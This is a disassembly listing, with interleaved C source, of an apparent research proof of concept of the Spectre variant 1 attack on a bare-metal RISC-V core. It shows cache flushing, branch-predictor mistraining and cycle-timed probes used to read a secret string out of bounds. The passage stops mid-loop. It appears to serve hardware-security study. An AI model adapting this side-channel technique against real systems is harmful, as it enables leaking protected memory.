
bin/spectre-v1.riscv：     文件格式 elf64-littleriscv


Disassembly of section .text.init:

0000000080000000 <_start>:
    80000000:	4081                	li	ra,0
    80000002:	4101                	li	sp,0
    80000004:	4181                	li	gp,0
    80000006:	4201                	li	tp,0
    80000008:	4281                	li	t0,0
    8000000a:	4301                	li	t1,0
    8000000c:	4381                	li	t2,0
    8000000e:	4401                	li	s0,0
    80000010:	4481                	li	s1,0
    80000012:	4501                	li	a0,0
    80000014:	4581                	li	a1,0
    80000016:	4601                	li	a2,0
    80000018:	4681                	li	a3,0
    8000001a:	4701                	li	a4,0
    8000001c:	4781                	li	a5,0
    8000001e:	4801                	li	a6,0
    80000020:	4881                	li	a7,0
    80000022:	4901                	li	s2,0
    80000024:	4981                	li	s3,0
    80000026:	4a01                	li	s4,0
    80000028:	4a81                	li	s5,0
    8000002a:	4b01                	li	s6,0
    8000002c:	4b81                	li	s7,0
    8000002e:	4c01                	li	s8,0
    80000030:	4c81                	li	s9,0
    80000032:	4d01                	li	s10,0
    80000034:	4d81                	li	s11,0
    80000036:	4e01                	li	t3,0
    80000038:	4e81                	li	t4,0
    8000003a:	4f01                	li	t5,0
    8000003c:	4f81                	li	t6,0
    8000003e:	62f9                	lui	t0,0x1e
    80000040:	3002a073          	csrs	mstatus,t0
    80000044:	4285                	li	t0,1
    80000046:	02fe                	slli	t0,t0,0x1f
    80000048:	0002d863          	bgez	t0,80000058 <_start+0x58>
    8000004c:	4505                	li	a0,1
    8000004e:	00001297          	auipc	t0,0x1
    80000052:	faa2a923          	sw	a0,-78(t0) # 80001000 <tohost>
    80000056:	bfdd                	j	8000004c <_start+0x4c>
    80000058:	00000297          	auipc	t0,0x0
    8000005c:	09028293          	addi	t0,t0,144 # 800000e8 <_start+0xe8>
    80000060:	30529073          	csrw	mtvec,t0
    80000064:	00301073          	fssr	zero
    80000068:	f0000053          	fmv.w.x	ft0,zero
    8000006c:	f00000d3          	fmv.w.x	ft1,zero
    80000070:	f0000153          	fmv.w.x	ft2,zero
    80000074:	f00001d3          	fmv.w.x	ft3,zero
    80000078:	f0000253          	fmv.w.x	ft4,zero
    8000007c:	f00002d3          	fmv.w.x	ft5,zero
    80000080:	f0000353          	fmv.w.x	ft6,zero
    80000084:	f00003d3          	fmv.w.x	ft7,zero
    80000088:	f0000453          	fmv.w.x	fs0,zero
    8000008c:	f00004d3          	fmv.w.x	fs1,zero
    80000090:	f0000553          	fmv.w.x	fa0,zero
    80000094:	f00005d3          	fmv.w.x	fa1,zero
    80000098:	f0000653          	fmv.w.x	fa2,zero
    8000009c:	f00006d3          	fmv.w.x	fa3,zero
    800000a0:	f0000753          	fmv.w.x	fa4,zero
    800000a4:	f00007d3          	fmv.w.x	fa5,zero
    800000a8:	f0000853          	fmv.w.x	fa6,zero
    800000ac:	f00008d3          	fmv.w.x	fa7,zero
    800000b0:	f0000953          	fmv.w.x	fs2,zero
    800000b4:	f00009d3          	fmv.w.x	fs3,zero
    800000b8:	f0000a53          	fmv.w.x	fs4,zero
    800000bc:	f0000ad3          	fmv.w.x	fs5,zero
    800000c0:	f0000b53          	fmv.w.x	fs6,zero
    800000c4:	f0000bd3          	fmv.w.x	fs7,zero
    800000c8:	f0000c53          	fmv.w.x	fs8,zero
    800000cc:	f0000cd3          	fmv.w.x	fs9,zero
    800000d0:	f0000d53          	fmv.w.x	fs10,zero
    800000d4:	f0000dd3          	fmv.w.x	fs11,zero
    800000d8:	f0000e53          	fmv.w.x	ft8,zero
    800000dc:	f0000ed3          	fmv.w.x	ft9,zero
    800000e0:	f0000f53          	fmv.w.x	ft10,zero
    800000e4:	f0000fd3          	fmv.w.x	ft11,zero
    800000e8:	00000297          	auipc	t0,0x0
    800000ec:	03c28293          	addi	t0,t0,60 # 80000124 <trap_entry>
    800000f0:	30529073          	csrw	mtvec,t0
    800000f4:	00003197          	auipc	gp,0x3
    800000f8:	2ec18193          	addi	gp,gp,748 # 800033e0 <__global_pointer$>
    800000fc:	0001b217          	auipc	tp,0x1b
    80000100:	40320213          	addi	tp,tp,1027 # 8001b4ff <_end+0x3f>
    80000104:	fc027213          	andi	tp,tp,-64
    80000108:	f1402573          	csrr	a0,mhartid
    8000010c:	4585                	li	a1,1
    8000010e:	00b57063          	bleu	a1,a0,8000010e <_start+0x10e>
    80000112:	01151613          	slli	a2,a0,0x11
    80000116:	9232                	add	tp,tp,a2
    80000118:	00150113          	addi	sp,a0,1
    8000011c:	0146                	slli	sp,sp,0x11
    8000011e:	9112                	add	sp,sp,tp
    80000120:	2d30106f          	j	80001bf2 <_init>

0000000080000124 <trap_entry>:
    80000124:	716d                	addi	sp,sp,-272
    80000126:	e406                	sd	ra,8(sp)
    80000128:	e80a                	sd	sp,16(sp)
    8000012a:	ec0e                	sd	gp,24(sp)
    8000012c:	f012                	sd	tp,32(sp)
    8000012e:	f416                	sd	t0,40(sp)
    80000130:	f81a                	sd	t1,48(sp)
    80000132:	fc1e                	sd	t2,56(sp)
    80000134:	e0a2                	sd	s0,64(sp)
    80000136:	e4a6                	sd	s1,72(sp)
    80000138:	e8aa                	sd	a0,80(sp)
    8000013a:	ecae                	sd	a1,88(sp)
    8000013c:	f0b2                	sd	a2,96(sp)
    8000013e:	f4b6                	sd	a3,104(sp)
    80000140:	f8ba                	sd	a4,112(sp)
    80000142:	fcbe                	sd	a5,120(sp)
    80000144:	e142                	sd	a6,128(sp)
    80000146:	e546                	sd	a7,136(sp)
    80000148:	e94a                	sd	s2,144(sp)
    8000014a:	ed4e                	sd	s3,152(sp)
    8000014c:	f152                	sd	s4,160(sp)
    8000014e:	f556                	sd	s5,168(sp)
    80000150:	f95a                	sd	s6,176(sp)
    80000152:	fd5e                	sd	s7,184(sp)
    80000154:	e1e2                	sd	s8,192(sp)
    80000156:	e5e6                	sd	s9,200(sp)
    80000158:	e9ea                	sd	s10,208(sp)
    8000015a:	edee                	sd	s11,216(sp)
    8000015c:	f1f2                	sd	t3,224(sp)
    8000015e:	f5f6                	sd	t4,232(sp)
    80000160:	f9fa                	sd	t5,240(sp)
    80000162:	fdfe                	sd	t6,248(sp)
    80000164:	34202573          	csrr	a0,mcause
    80000168:	341025f3          	csrr	a1,mepc
    8000016c:	860a                	mv	a2,sp
    8000016e:	161010ef          	jal	ra,80001ace <handle_trap>
    80000172:	34151073          	csrw	mepc,a0
    80000176:	000022b7          	lui	t0,0x2
    8000017a:	8002829b          	addiw	t0,t0,-2048
    8000017e:	3002a073          	csrs	mstatus,t0
    80000182:	60a2                	ld	ra,8(sp)
    80000184:	6142                	ld	sp,16(sp)
    80000186:	61e2                	ld	gp,24(sp)
    80000188:	7202                	ld	tp,32(sp)
    8000018a:	72a2                	ld	t0,40(sp)
    8000018c:	7342                	ld	t1,48(sp)
    8000018e:	73e2                	ld	t2,56(sp)
    80000190:	6406                	ld	s0,64(sp)
    80000192:	64a6                	ld	s1,72(sp)
    80000194:	6546                	ld	a0,80(sp)
    80000196:	65e6                	ld	a1,88(sp)
    80000198:	7606                	ld	a2,96(sp)
    8000019a:	76a6                	ld	a3,104(sp)
    8000019c:	7746                	ld	a4,112(sp)
    8000019e:	77e6                	ld	a5,120(sp)
    800001a0:	680a                	ld	a6,128(sp)
    800001a2:	68aa                	ld	a7,136(sp)
    800001a4:	694a                	ld	s2,144(sp)
    800001a6:	69ea                	ld	s3,152(sp)
    800001a8:	7a0a                	ld	s4,160(sp)
    800001aa:	7aaa                	ld	s5,168(sp)
    800001ac:	7b4a                	ld	s6,176(sp)
    800001ae:	7bea                	ld	s7,184(sp)
    800001b0:	6c0e                	ld	s8,192(sp)
    800001b2:	6cae                	ld	s9,200(sp)
    800001b4:	6d4e                	ld	s10,208(sp)
    800001b6:	6dee                	ld	s11,216(sp)
    800001b8:	7e0e                	ld	t3,224(sp)
    800001ba:	7eae                	ld	t4,232(sp)
    800001bc:	7f4e                	ld	t5,240(sp)
    800001be:	7fee                	ld	t6,248(sp)
    800001c0:	6151                	addi	sp,sp,272
    800001c2:	30200073          	mret

Disassembly of section .tohost:

0000000080001000 <tohost>:
	...

0000000080001040 <fromhost>:
	...

Disassembly of section .text:

0000000080001048 <flushCache>:
 *
 * @param addr starting address to clear the cache
 * @param sz size of the data to remove in bytes
 */
void flushCache(uint64_t addr, uint64_t sz)
{
    80001048:	711d                	addi	sp,sp,-96
    8000104a:	eca2                	sd	s0,88(sp)
    8000104c:	1080                	addi	s0,sp,96
    8000104e:	faa43423          	sd	a0,-88(s0)
    80001052:	fab43023          	sd	a1,-96(s0)
    // printf("Flushed addr(0x%lx) tag(0x%lx) set(0x%lx) off(0x%lx) sz(%ld)\n", addr, (addr & TAG_MASK) >> (L1_SET_BITS + L1_BLOCK_BITS), 
    //                                                                    (addr & SET_MASK) >> L1_BLOCK_BITS, addr & OFF_MASK, sz);

    // find out the amount of blocks you want to clear
    uint64_t numSetsClear = sz >> L1_BLOCK_BITS;
    80001056:	fa043783          	ld	a5,-96(s0)
    8000105a:	8399                	srli	a5,a5,0x6
    8000105c:	fef43423          	sd	a5,-24(s0)
    if ((sz & OFF_MASK) != 0)
    80001060:	fa043783          	ld	a5,-96(s0)
    80001064:	03f7f793          	andi	a5,a5,63
    80001068:	c791                	beqz	a5,80001074 <flushCache+0x2c>
    {
        numSetsClear += 1;
    8000106a:	fe843783          	ld	a5,-24(s0)
    8000106e:	0785                	addi	a5,a5,1
    80001070:	fef43423          	sd	a5,-24(s0)
    }

    if (numSetsClear > L1_SETS)
    80001074:	fe843703          	ld	a4,-24(s0)
    80001078:	04000793          	li	a5,64
    8000107c:	00e7f663          	bleu	a4,a5,80001088 <flushCache+0x40>
    {
        // flush entire cache with no rollover (makes the function finish faster) 
        numSetsClear = L1_SETS;
    80001080:	04000793          	li	a5,64
    80001084:	fef43423          	sd	a5,-24(s0)
    }
    
    //printf("numSetsClear(%ld)\n", numSetsClear);

    // temp variable used for nothing
    uint8_t dummy = 0;
    80001088:	fc040ba3          	sb	zero,-41(s0)

    // this mem address is the start of a contiguous set of memory that will fit inside of the cache
    // thus it has the following properties
    // 1. dummyMem <= alignedMem < dummyMem + sizeof(dummyMem)
    // 2. alignedMem has idx = 0 and offset = 0 
    uint64_t alignedMem = (((uint64_t)dummyMem) + L1_SZ_BYTES) & TAG_MASK;
    8000108c:	00002717          	auipc	a4,0x2
    80001090:	b7470713          	addi	a4,a4,-1164 # 80002c00 <dummyMem>
    80001094:	6791                	lui	a5,0x4
    80001096:	973e                	add	a4,a4,a5
    80001098:	77fd                	lui	a5,0xfffff
    8000109a:	8ff9                	and	a5,a5,a4
    8000109c:	fcf43423          	sd	a5,-56(s0)
    //printf("alignedMem(0x%lx)\n", alignedMem);
        
    for (uint64_t i = 0; i < numSetsClear; ++i)
    800010a0:	fe043023          	sd	zero,-32(s0)
    800010a4:	a8b9                	j	80001102 <flushCache+0xba>
    {
        // offset to move across the sets that you want to flush
        uint64_t setOffset = (((addr & SET_MASK) >> L1_BLOCK_BITS) + i) << L1_BLOCK_BITS;
    800010a6:	fa843783          	ld	a5,-88(s0)
    800010aa:	8399                	srli	a5,a5,0x6
    800010ac:	03f7f713          	andi	a4,a5,63
    800010b0:	fe043783          	ld	a5,-32(s0)
    800010b4:	97ba                	add	a5,a5,a4
    800010b6:	079a                	slli	a5,a5,0x6
    800010b8:	fcf43023          	sd	a5,-64(s0)
        //printf("setOffset(0x%lx)\n", setOffset);

        // since there are L1_WAYS you need to flush the entire set
        for(uint64_t j = 0; j < 4*L1_WAYS; ++j)   //j < 4*L1_WAYS
    800010bc:	fc043c23          	sd	zero,-40(s0)
    800010c0:	a03d                	j	800010ee <flushCache+0xa6>
        {
            // offset to reaccess the set
            uint64_t wayOffset = j << (L1_BLOCK_BITS + L1_SET_BITS);
    800010c2:	fd843783          	ld	a5,-40(s0)
    800010c6:	07b2                	slli	a5,a5,0xc
    800010c8:	faf43c23          	sd	a5,-72(s0)
            //printf("wayOffset(0x%lx)\n", wayOffset);

            // evict the previous cache block and put in the dummy mem
            dummy = *((uint8_t*)(alignedMem + setOffset + wayOffset));
    800010cc:	fc843703          	ld	a4,-56(s0)
    800010d0:	fc043783          	ld	a5,-64(s0)
    800010d4:	973e                	add	a4,a4,a5
    800010d6:	fb843783          	ld	a5,-72(s0)
    800010da:	97ba                	add	a5,a5,a4
    800010dc:	0007c783          	lbu	a5,0(a5) # fffffffffffff000 <_end+0xffffffff7ffe3b40>
    800010e0:	fcf40ba3          	sb	a5,-41(s0)
        for(uint64_t j = 0; j < 4*L1_WAYS; ++j)   //j < 4*L1_WAYS
    800010e4:	fd843783          	ld	a5,-40(s0)
    800010e8:	0785                	addi	a5,a5,1
    800010ea:	fcf43c23          	sd	a5,-40(s0)
    800010ee:	fd843703          	ld	a4,-40(s0)
    800010f2:	47bd                	li	a5,15
    800010f4:	fce7f7e3          	bleu	a4,a5,800010c2 <flushCache+0x7a>
    for (uint64_t i = 0; i < numSetsClear; ++i)
    800010f8:	fe043783          	ld	a5,-32(s0)
    800010fc:	0785                	addi	a5,a5,1
    800010fe:	fef43023          	sd	a5,-32(s0)
    80001102:	fe043703          	ld	a4,-32(s0)
    80001106:	fe843783          	ld	a5,-24(s0)
    8000110a:	f8f76ee3          	bltu	a4,a5,800010a6 <flushCache+0x5e>
            //printf("evict read(0x%lx)\n", alignedMem + setOffset + wayOffset);
        }
    }
}
    8000110e:	0001                	nop
    80001110:	6466                	ld	s0,88(sp)
    80001112:	6125                	addi	sp,sp,96
    80001114:	8082                	ret

0000000080001116 <topTwoIdx>:
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    80001116:	7139                	addi	sp,sp,-64
    80001118:	fc22                	sd	s0,56(sp)
    8000111a:	0080                	addi	s0,sp,64
    8000111c:	fca43c23          	sd	a0,-40(s0)
    80001120:	fcb43823          	sd	a1,-48(s0)
    80001124:	fcc43423          	sd	a2,-56(s0)
    80001128:	fcd43023          	sd	a3,-64(s0)
    outValArray[0] = 0;
    8000112c:	fc043783          	ld	a5,-64(s0)
    80001130:	0007b023          	sd	zero,0(a5)
    outValArray[1] = 0;
    80001134:	fc043783          	ld	a5,-64(s0)
    80001138:	07a1                	addi	a5,a5,8
    8000113a:	0007b023          	sd	zero,0(a5)

    for (uint64_t i = 0; i < inArraySize; ++i){
    8000113e:	fe043423          	sd	zero,-24(s0)
    80001142:	a075                	j	800011ee <topTwoIdx+0xd8>
        if (inArray[i] > outValArray[0]){
    80001144:	fe843783          	ld	a5,-24(s0)
    80001148:	078e                	slli	a5,a5,0x3
    8000114a:	fd843703          	ld	a4,-40(s0)
    8000114e:	97ba                	add	a5,a5,a4
    80001150:	6398                	ld	a4,0(a5)
    80001152:	fc043783          	ld	a5,-64(s0)
    80001156:	639c                	ld	a5,0(a5)
    80001158:	04e7f563          	bleu	a4,a5,800011a2 <topTwoIdx+0x8c>
            outValArray[1] = outValArray[0];
    8000115c:	fc043783          	ld	a5,-64(s0)
    80001160:	07a1                	addi	a5,a5,8
    80001162:	fc043703          	ld	a4,-64(s0)
    80001166:	6318                	ld	a4,0(a4)
    80001168:	e398                	sd	a4,0(a5)
            outValArray[0] = inArray[i];
    8000116a:	fe843783          	ld	a5,-24(s0)
    8000116e:	078e                	slli	a5,a5,0x3
    80001170:	fd843703          	ld	a4,-40(s0)
    80001174:	97ba                	add	a5,a5,a4
    80001176:	6398                	ld	a4,0(a5)
    80001178:	fc043783          	ld	a5,-64(s0)
    8000117c:	e398                	sd	a4,0(a5)
            outIdxArray[1] = outIdxArray[0];
    8000117e:	fc843783          	ld	a5,-56(s0)
    80001182:	0785                	addi	a5,a5,1
    80001184:	fc843703          	ld	a4,-56(s0)
    80001188:	00074703          	lbu	a4,0(a4)
    8000118c:	00e78023          	sb	a4,0(a5)
            outIdxArray[0] = i;
    80001190:	fe843783          	ld	a5,-24(s0)
    80001194:	0ff7f713          	andi	a4,a5,255
    80001198:	fc843783          	ld	a5,-56(s0)
    8000119c:	00e78023          	sb	a4,0(a5)
    800011a0:	a091                	j	800011e4 <topTwoIdx+0xce>
        }
        else if (inArray[i] > outValArray[1]){
    800011a2:	fe843783          	ld	a5,-24(s0)
    800011a6:	078e                	slli	a5,a5,0x3
    800011a8:	fd843703          	ld	a4,-40(s0)
    800011ac:	97ba                	add	a5,a5,a4
    800011ae:	6398                	ld	a4,0(a5)
    800011b0:	fc043783          	ld	a5,-64(s0)
    800011b4:	07a1                	addi	a5,a5,8
    800011b6:	639c                	ld	a5,0(a5)
    800011b8:	02e7f663          	bleu	a4,a5,800011e4 <topTwoIdx+0xce>
            outValArray[1] = inArray[i];
    800011bc:	fe843783          	ld	a5,-24(s0)
    800011c0:	078e                	slli	a5,a5,0x3
    800011c2:	fd843703          	ld	a4,-40(s0)
    800011c6:	973e                	add	a4,a4,a5
    800011c8:	fc043783          	ld	a5,-64(s0)
    800011cc:	07a1                	addi	a5,a5,8
    800011ce:	6318                	ld	a4,0(a4)
    800011d0:	e398                	sd	a4,0(a5)
            outIdxArray[1] = i;
    800011d2:	fc843783          	ld	a5,-56(s0)
    800011d6:	0785                	addi	a5,a5,1
    800011d8:	fe843703          	ld	a4,-24(s0)
    800011dc:	0ff77713          	andi	a4,a4,255
    800011e0:	00e78023          	sb	a4,0(a5)
    for (uint64_t i = 0; i < inArraySize; ++i){
    800011e4:	fe843783          	ld	a5,-24(s0)
    800011e8:	0785                	addi	a5,a5,1
    800011ea:	fef43423          	sd	a5,-24(s0)
    800011ee:	fe843703          	ld	a4,-24(s0)
    800011f2:	fd043783          	ld	a5,-48(s0)
    800011f6:	f4f767e3          	bltu	a4,a5,80001144 <topTwoIdx+0x2e>
        }
    }
}
    800011fa:	0001                	nop
    800011fc:	7462                	ld	s0,56(sp)
    800011fe:	6121                	addi	sp,sp,64
    80001200:	8082                	ret

0000000080001202 <victimFunc>:
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */
void victimFunc(uint64_t idx){
    80001202:	7179                	addi	sp,sp,-48
    80001204:	f422                	sd	s0,40(sp)
    80001206:	1800                	addi	s0,sp,48
    80001208:	fca43c23          	sd	a0,-40(s0)
    uint8_t dummy = 2;
    8000120c:	4789                	li	a5,2
    8000120e:	fef407a3          	sb	a5,-17(s0)

    // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
    array1_sz =  array1_sz << 4;
    80001212:	00002797          	auipc	a5,0x2
    80001216:	9ce78793          	addi	a5,a5,-1586 # 80002be0 <array1_sz>
    8000121a:	639c                	ld	a5,0(a5)
    8000121c:	00479713          	slli	a4,a5,0x4
    80001220:	00002797          	auipc	a5,0x2
    80001224:	9c078793          	addi	a5,a5,-1600 # 80002be0 <array1_sz>
    80001228:	e398                	sd	a4,0(a5)
    asm("fcvt.s.lu	fa4, %[in]\n"
    8000122a:	00002797          	auipc	a5,0x2
    8000122e:	9b678793          	addi	a5,a5,-1610 # 80002be0 <array1_sz>
    80001232:	639c                	ld	a5,0(a5)
    80001234:	fef44703          	lbu	a4,-17(s0)
    80001238:	d0377753          	fcvt.s.lu	fa4,a4
    8000123c:	d037f7d3          	fcvt.s.lu	fa5,a5
    80001240:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001244:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001248:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    8000124c:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001250:	c0379753          	fcvt.lu.s	a4,fa5,rtz
    80001254:	00002797          	auipc	a5,0x2
    80001258:	98c78793          	addi	a5,a5,-1652 # 80002be0 <array1_sz>
    8000125c:	e398                	sd	a4,0(a5)
        "fcvt.lu.s	%[out], fa5, rtz\n"
        : [out] "=r" (array1_sz)
        : [inout] "r" (array1_sz), [in] "r" (dummy)
        : "fa4", "fa5");

    if (idx < array1_sz){
    8000125e:	00002797          	auipc	a5,0x2
    80001262:	98278793          	addi	a5,a5,-1662 # 80002be0 <array1_sz>
    80001266:	639c                	ld	a5,0(a5)
    80001268:	fd843703          	ld	a4,-40(s0)
    8000126c:	02f77863          	bleu	a5,a4,8000129c <victimFunc+0x9a>
        dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    80001270:	00002717          	auipc	a4,0x2
    80001274:	8d070713          	addi	a4,a4,-1840 # 80002b40 <array1>
    80001278:	fd843783          	ld	a5,-40(s0)
    8000127c:	97ba                	add	a5,a5,a4
    8000127e:	0007c783          	lbu	a5,0(a5)
    80001282:	2781                	sext.w	a5,a5
    80001284:	0067979b          	slliw	a5,a5,0x6
    80001288:	2781                	sext.w	a5,a5
    8000128a:	00016717          	auipc	a4,0x16
    8000128e:	9f670713          	addi	a4,a4,-1546 # 80016c80 <array2>
    80001292:	97ba                	add	a5,a5,a4
    80001294:	0007c783          	lbu	a5,0(a5)
    80001298:	fef407a3          	sb	a5,-17(s0)
    }

    // bound speculation here just in case it goes over
    dummy = rdcycle();
    8000129c:	c00027f3          	rdcycle	a5
    800012a0:	fef43023          	sd	a5,-32(s0)
    800012a4:	fe043783          	ld	a5,-32(s0)
    800012a8:	fef407a3          	sb	a5,-17(s0)
}
    800012ac:	0001                	nop
    800012ae:	7422                	ld	s0,40(sp)
    800012b0:	6145                	addi	sp,sp,48
    800012b2:	8082                	ret

00000000800012b4 <main>:

int main(void){
    800012b4:	7171                	addi	sp,sp,-176
    800012b6:	f506                	sd	ra,168(sp)
    800012b8:	f122                	sd	s0,160(sp)
    800012ba:	1900                	addi	s0,sp,176
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    800012bc:	00002797          	auipc	a5,0x2
    800012c0:	92c78793          	addi	a5,a5,-1748 # 80002be8 <secretString>
    800012c4:	639c                	ld	a5,0(a5)
    800012c6:	873e                	mv	a4,a5
    800012c8:	00002797          	auipc	a5,0x2
    800012cc:	87878793          	addi	a5,a5,-1928 # 80002b40 <array1>
    800012d0:	40f707b3          	sub	a5,a4,a5
    800012d4:	fef43423          	sd	a5,-24(s0)
    uint64_t start, diff, passInIdx, randIdx;
    uint8_t dummy = 0;
    800012d8:	fe0403a3          	sb	zero,-25(s0)
    //         fprintf(stderr, "fopen() failed.\n");
    //         exit(EXIT_FAILURE);
    //     }
    //     fprintf(fp, "Array Index,Access time(cycles)\n");

    printf("================= This is a POC of spectre_v1 (Branch Condition Check Bypass) ========================= \n");
    800012dc:	00001517          	auipc	a0,0x1
    800012e0:	55450513          	addi	a0,a0,1364 # 80002830 <atol+0xfc>
    800012e4:	028010ef          	jal	ra,8000230c <printf>
    printf("the secret key is:%s \n", secretString);
    800012e8:	00002797          	auipc	a5,0x2
    800012ec:	90078793          	addi	a5,a5,-1792 # 80002be8 <secretString>
    800012f0:	639c                	ld	a5,0(a5)
    800012f2:	85be                	mv	a1,a5
    800012f4:	00001517          	auipc	a0,0x1
    800012f8:	5ac50513          	addi	a0,a0,1452 # 800028a0 <atol+0x16c>
    800012fc:	010010ef          	jal	ra,8000230c <printf>

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len){
    80001300:	fc043c23          	sd	zero,-40(s0)
    80001304:	ac55                	j	800015b8 <main+0x304>

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
    80001306:	fc043823          	sd	zero,-48(s0)
    8000130a:	a005                	j	8000132a <main+0x76>
            results[cIdx] = 0;
    8000130c:	0001a717          	auipc	a4,0x1a
    80001310:	97470713          	addi	a4,a4,-1676 # 8001ac80 <results.2909>
    80001314:	fd043783          	ld	a5,-48(s0)
    80001318:	078e                	slli	a5,a5,0x3
    8000131a:	97ba                	add	a5,a5,a4
    8000131c:	0007b023          	sd	zero,0(a5)
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
    80001320:	fd043783          	ld	a5,-48(s0)
    80001324:	0785                	addi	a5,a5,1
    80001326:	fcf43823          	sd	a5,-48(s0)
    8000132a:	fd043703          	ld	a4,-48(s0)
    8000132e:	0ff00793          	li	a5,255
    80001332:	fce7fde3          	bleu	a4,a5,8000130c <main+0x58>
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
    80001336:	fc043423          	sd	zero,-56(s0)
    8000133a:	a2a9                	j	80001484 <main+0x1d0>

            // make sure array you read from is not in the cache
            flushCache((uint64_t)array2, sizeof(array2));
    8000133c:	00016797          	auipc	a5,0x16
    80001340:	94478793          	addi	a5,a5,-1724 # 80016c80 <array2>
    80001344:	6591                	lui	a1,0x4
    80001346:	853e                	mv	a0,a5
    80001348:	d01ff0ef          	jal	ra,80001048 <flushCache>

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
    8000134c:	47c1                	li	a5,16
    8000134e:	fcf43023          	sd	a5,-64(s0)
    80001352:	a059                	j	800013d8 <main+0x124>
                // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                randIdx = atkRound % array1_sz;
    80001354:	00002797          	auipc	a5,0x2
    80001358:	88c78793          	addi	a5,a5,-1908 # 80002be0 <array1_sz>
    8000135c:	639c                	ld	a5,0(a5)
    8000135e:	fc843703          	ld	a4,-56(s0)
    80001362:	02f777b3          	remu	a5,a4,a5
    80001366:	f8f43023          	sd	a5,-128(s0)
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
    8000136a:	fc043703          	ld	a4,-64(s0)
    8000136e:	47c5                	li	a5,17
    80001370:	02f767b3          	rem	a5,a4,a5
    80001374:	17fd                	addi	a5,a5,-1
    80001376:	873e                	mv	a4,a5
    80001378:	77c1                	lui	a5,0xffff0
    8000137a:	8ff9                	and	a5,a5,a4
    8000137c:	f6f43c23          	sd	a5,-136(s0)
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
    80001380:	f7843783          	ld	a5,-136(s0)
    80001384:	83c1                	srli	a5,a5,0x10
    80001386:	f7843703          	ld	a4,-136(s0)
    8000138a:	8fd9                	or	a5,a5,a4
    8000138c:	f6f43c23          	sd	a5,-136(s0)
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
    80001390:	fe843703          	ld	a4,-24(s0)
    80001394:	f8043783          	ld	a5,-128(s0)
    80001398:	8f3d                	xor	a4,a4,a5
    8000139a:	f7843783          	ld	a5,-136(s0)
    8000139e:	8ff9                	and	a5,a5,a4
    800013a0:	f8043703          	ld	a4,-128(s0)
    800013a4:	8fb9                	xor	a5,a5,a4
    800013a6:	f6f43c23          	sd	a5,-136(s0)

                // set of constant takens to make the BHR be in a all taken state
                for(uint64_t k = 0; k < 100; ++k){
    800013aa:	fa043c23          	sd	zero,-72(s0)
    800013ae:	a031                	j	800013ba <main+0x106>
    800013b0:	fb843783          	ld	a5,-72(s0)
    800013b4:	0785                	addi	a5,a5,1
    800013b6:	faf43c23          	sd	a5,-72(s0)
    800013ba:	fb843703          	ld	a4,-72(s0)
    800013be:	06300793          	li	a5,99
    800013c2:	fee7f7e3          	bleu	a4,a5,800013b0 <main+0xfc>
                    asm("");
                }

                // call function to train or attack
                victimFunc(passInIdx);
    800013c6:	f7843503          	ld	a0,-136(s0)
    800013ca:	e39ff0ef          	jal	ra,80001202 <victimFunc>
            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
    800013ce:	fc043783          	ld	a5,-64(s0)
    800013d2:	17fd                	addi	a5,a5,-1
    800013d4:	fcf43023          	sd	a5,-64(s0)
    800013d8:	fc043783          	ld	a5,-64(s0)
    800013dc:	f607dce3          	bgez	a5,80001354 <main+0xa0>
            


            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i){
    800013e0:	fa043823          	sd	zero,-80(s0)
    800013e4:	a069                	j	8000146e <main+0x1ba>
                uint64_t  uiTemp = 0;  //introduced a dummy variable to prevent compiler optimizations
    800013e6:	fa043423          	sd	zero,-88(s0)
                start = rdcycle();
    800013ea:	c00027f3          	rdcycle	a5
    800013ee:	faf43023          	sd	a5,-96(s0)
    800013f2:	fa043783          	ld	a5,-96(s0)
    800013f6:	f8f43c23          	sd	a5,-104(s0)
                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
    800013fa:	fb043783          	ld	a5,-80(s0)
    800013fe:	079a                	slli	a5,a5,0x6
    80001400:	00016717          	auipc	a4,0x16
    80001404:	88070713          	addi	a4,a4,-1920 # 80016c80 <array2>
    80001408:	97ba                	add	a5,a5,a4
    8000140a:	0007c703          	lbu	a4,0(a5) # ffffffffffff0000 <_end+0xffffffff7ffd4b40>
    8000140e:	fe744783          	lbu	a5,-25(s0)
    80001412:	8ff9                	and	a5,a5,a4
    80001414:	fef403a3          	sb	a5,-25(s0)
                diff = (rdcycle() - start);
    80001418:	c00027f3          	rdcycle	a5
    8000141c:	f8f43823          	sd	a5,-112(s0)
    80001420:	f9043703          	ld	a4,-112(s0)
    80001424:	f9843783          	ld	a5,-104(s0)
    80001428:	40f707b3          	sub	a5,a4,a5
    8000142c:	f8f43423          	sd	a5,-120(s0)
                //printf("%d,%d\n",i, diff);

